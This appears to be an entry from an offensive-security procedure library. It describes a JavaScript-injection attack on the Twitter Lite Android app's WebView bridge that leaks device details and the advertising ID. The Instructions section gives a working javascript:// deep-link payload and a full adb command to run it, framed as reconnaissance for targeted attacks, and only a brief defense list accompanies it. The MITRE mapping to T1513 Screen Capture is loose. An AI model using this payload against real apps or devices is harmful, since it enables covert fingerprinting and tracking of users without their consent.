---
tags:
  - android
  - device-info-leak
  - javascript-injection
type: procedure
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/adb-invoke-getnymizerparams-in-twitterlite]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[T1513]]'
updated_at: '2025-12-14T17:24:31.856Z'
sub_techniques: []
id: de1a9b39-e043-4ab4-a6ac-84dfd9713465
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[T1513]]'
---
# Invoke apkInterface.getNymizerParams for Device Info Leak via JavaScript Injection

## Summary

This procedure invokes the getNymizerParams method on apkInterface via JS injection to leak detailed device information including brand, model, carrier, OS version, and advertising ID.

## Description

The method returns anonymization parameters used by the app, but exposed via JS bridge, allowing full device fingerprinting. This data can be combined with tokens for targeted attacks.

## Requirements

1. Access to apkInterface
2. ADB

## Defense

Defensive measures and detection strategies:

- Restrict method access to authenticated or internal calls only
- Sanitize output to remove sensitive fields
- Use proguard or obfuscation on interface names

## Objectives

1. Collect device profiling data
2. Enhance attack reconnaissance
3. Expose privacy risks in JS bridges

## Instructions

### Step 1: Prepare Payload

**Context**: JS for method invocation.

Payload: javascript://google.com%0Ajavascript:document.write(apkInterface.getNymizerParams());

### Step 2: Inject and Leak

**Context**: Run to output device params.

**Command** ([[commands/adb-invoke-getnymizerparams-in-twitterlite]]):
```bash
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:document.write(apkInterface.getNymizerParams());"
```

> Displays JSON with device details.

**Expected Output**: JSON like {"dev_brand":"xiaomi","dev_model":"Redmi Note 4"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[T1513]] Screen Capture (adapted for info leak)

### Sub-Techniques


## Commands Used

- [[commands/adb-invoke-getnymizerparams-in-twitterlite]]

## Tools Used

- [[tools/ADB-Android-Debug-Bridge]]

## Tags

- android
- device-info-leak
- javascript-injection
- webview
